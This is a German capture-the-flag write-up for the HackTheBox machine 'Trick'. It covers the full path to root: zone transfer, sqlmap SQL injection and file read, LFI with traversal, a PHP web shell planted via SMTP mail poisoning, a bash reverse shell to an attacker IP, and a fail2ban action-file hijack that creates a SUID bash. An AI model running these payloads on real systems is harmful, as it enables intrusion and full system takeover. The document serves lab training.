---
tags: [htb, linux, easy, writeup]
cve: CVE-2022-28468
techniques: [zone-transfer, sqli, lfi, mail-poisoning, fail2ban, suid]
---
# Trick (HTB)

| Feld               | Wert                                      |
| ------------------ | ----------------------------------------- |
| OS                 | Linux                                     |
| Difficulty         | Easy                                      |
| Box IP             | `10.129.2.82` (ändert sich bei Redeploy!) |
| Attacker IP (tun0) | `<attacker-ip>`                             |

> [!info] Kill Chain
> [[Zone Transfer]] → vHost → [[SQL Injection|SQLi]] (File Read) → nginx-Config → 2. vHost mit [[Local File Inclusion|LFI]] → [[Mail Poisoning]] (RCE) → [[fail2ban Abuse]] → [[SUID Abuse|SUID]] → **root**

---

# 1 · Enumeration

## Zone Transfer → [[Zone Transfer]]
- `nmap -sCV 10.129.2.82` → `53/tcp open domain` => Zone Transfer testen
```bash
dig axfr trick.htb @10.129.2.82
# => preprod-payroll.trick.htb   (erster vHost)
```
- In `/etc/hosts` aufnehmen zur Auflösung der DNS
```bash
sudo nano /etc/hosts
# 10.129.2.82  trick.htb preprod-payroll.trick.htb
curl http://preprod-payroll.trick.htb | grep -i title
# => Payroll Management System
```

---

# 2 · Foothold

## 2.1 SQLi → [[SQL Injection]]
- Login-Request abfangen (DevTools → *Copy Request Headers*)
- Body ergänzen (`username=jn&password=na`)
- als `trick_req.txt` speichern:
```http
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=alksf2i0267tg0rg4rbn76usc5

username=jn&password=na
```
```bash
sqlmap -r trick_req.txt --batch --dbs
# => username verwundbar (time-based blind, MariaDB)
# => DBs: information_schema, payroll_db
```

## 2.2 FILE-Recht → nginx-Config
```bash
sqlmap -r trick_req.txt --batch --is-dba --privileges   # => FILE ✅
sqlmap -r trick_req.txt --batch --threads=10 \
  --file-read=/etc/nginx/sites-enabled/default
```
Config enthält 3 `server_name` → neuer vHost:

| server_name                   | root               |
| ----------------------------- | ------------------ |
| `trick.htb`                   | `/var/www/html`    |
| `preprod-payroll.trick.htb`   | `/var/www/payroll` |
| `preprod-marketing.trick.htb` | `/var/www/market`  |

=> `preprod-marketing.trick.htb` in `/etc/hosts` eintragen.

> [!note] DNS ≠ nginx
> Zone Transfer zeigt nur, was der **DNS** kennt. `preprod-marketing` hat keinen DNS-Eintrag → nur über die nginx-Config auffindbar. Das wird meist für interne Webserver-Kommunikation verwendet

## 2.3 LFI → [[Local File Inclusion]]
`?page=` lädt Dateien → `/etc/passwd` lesen:
```bash
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd" | grep 1001
# michael:x:1001:1001::/home/michael:/bin/bash
```
=> User mit UID 1001 = **`michael`** (`....//` = Nested Traversal gegen den Filter)

## 2.4 LFI → [[Mail Poisoning]] -> RCE
**(1)** PHP-Payload per Mail einschleusen (SMTP 25):
```bash
printf 'HELO trick.htb\nMAIL FROM:<a@trick.htb>\nRCPT TO:<michael@localhost>\nDATA\nSubject: pwn\n\n<?php system($_GET["cmd"]); ?>\n.\nQUIT\n' | nc 10.129.2.82 25
```
> [!warning] `454 Relay access denied`
> Nur `michael@localhost` / `@debian.localdomain` akzeptiert, nicht `@trick.htb`.

**(2)** Mail via LFI einbinden + Befehl:
```bash
curl "http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//var/mail/michael&cmd=id"
# uid=1001(michael) ... groups=1001(michael),1002(security)   <- security merken!
```

## 2.5 User-Flag
```bash
curl -G "http://preprod-marketing.trick.htb/index.php" \
  --data-urlencode "page=....//....//....//....//....//var/mail/michael" \
  --data-urlencode "cmd=cat /home/michael/user.txt"
# => 32 hex
```

---

# 3 · Privilege Escalation → [[fail2ban Abuse]]

## 3.1 sudo-Rechte des Users checken
```bash
# ...&cmd=sudo%20-l
(root) NOPASSWD: /etc/init.d/fail2ban restart
```
=> Lücke = `security`-Gruppe + passwortloser fail2ban-Restart.

## 3.2 Reverse Shell aufbauen → [[Reverse Shell]]
```bash
# Terminal 1
nc -lvnp 4444
# Terminal 2
curl -G "http://preprod-marketing.trick.htb/index.php" \
  --data-urlencode "page=....//....//....//....//....//var/mail/michael" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
```
Shell-Upgrade: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Strg+Z` → `stty raw -echo; fg` → `export TERM=xterm`

## 3.3 Action-Datei kapern → [[fail2ban Abuse]] (mit [[SUID Abuse]])
```bash
ls -la /etc/fail2ban/action.d/
# drwxrwx--- root security   <- michael (security) darf im Ordner schreiben
```
```bash
cd /etc/fail2ban/action.d/
mv iptables-multiport.conf iptables-multiport.conf.bak   # umbenennen (Datei-Recht fehlt)
cat > iptables-multiport.conf << 'EOF'
[Definition]
actionstart =
actionstop =
actioncheck =
actionban = cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash
actionunban =
EOF
sudo /etc/init.d/fail2ban restart
```
> [!danger] `chmod +s` reicht NICHT
> `+s` → `-rws--S---` (kein `x` für Gruppe/Andere) → `Permission denied`.
> `chmod 4755` → `-rwsr-xr-x` → ausführbar.

## 3.4 Ban auslösen + Root
```bash
# von Kali: fehlgeschlagene SSH-Logins => Ban
for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no bad@10.129.2.82; done
```
```bash
ls -la /tmp/rootbash        # -rwsr-xr-x root root
/tmp/rootbash -p            # -p = root-Rechte behalten
id                          # euid=0(root) ✅
cat /root/root.txt          # => 32 hex
```
